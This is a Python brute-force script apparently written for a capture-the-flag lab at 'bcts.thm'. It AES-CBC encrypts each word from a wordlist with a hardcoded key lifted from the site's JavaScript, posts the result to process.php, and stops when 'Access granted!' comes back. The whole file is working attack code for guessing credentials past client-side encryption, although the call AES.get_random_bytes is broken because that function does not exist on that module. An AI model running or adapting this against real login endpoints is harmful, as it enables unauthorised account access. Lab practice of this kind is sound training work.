import requests
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Configuration
url = "http://bcts.thm/labs/lab3/process.php"
encryption_key = b"1234567890123456"  # Must be 16 bytes (same as in the JavaScript)
wordlist_path = "wordlist.txt"        # Path to the wordlist

# Function to encrypt a message
def encrypt_message(message, iv):
    # Pad the message to a multiple of the block size (16 bytes for AES)
    padded_message = pad(message.encode(), AES.block_size)
    # Encrypt using AES-CBC
    cipher = AES.new(encryption_key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(padded_message)
    # Encode ciphertext and IV in Base64 for transmission
    return base64.b64encode(ciphertext).decode(), base64.b64encode(iv).decode()

# Function to send the payload
def send_payload(ciphertext, iv):
    payload = {"data": ciphertext, "iv": iv}
    response = requests.post(url, json=payload)
    return response.text

# Main bruteforce function
def bruteforce():
    with open(wordlist_path, "r") as f:
        words = f.readlines()

    for word in words:
        word = word.strip()
        print(f"Trying: {word}")
        # Generate a random IV (16 bytes)
        iv = AES.get_random_bytes(16)
        # Encrypt the current word
        ciphertext, iv_base64 = encrypt_message(word, iv)
        # Send the payload to the server
        response = send_payload(ciphertext, iv_base64)
        print(f"Response: {response}")
        # Check if the response indicates success
        if "Access granted!" in response:
            print(f"[+] Found the correct message: {word}")
            break

if __name__ == "__main__":
    bruteforce()
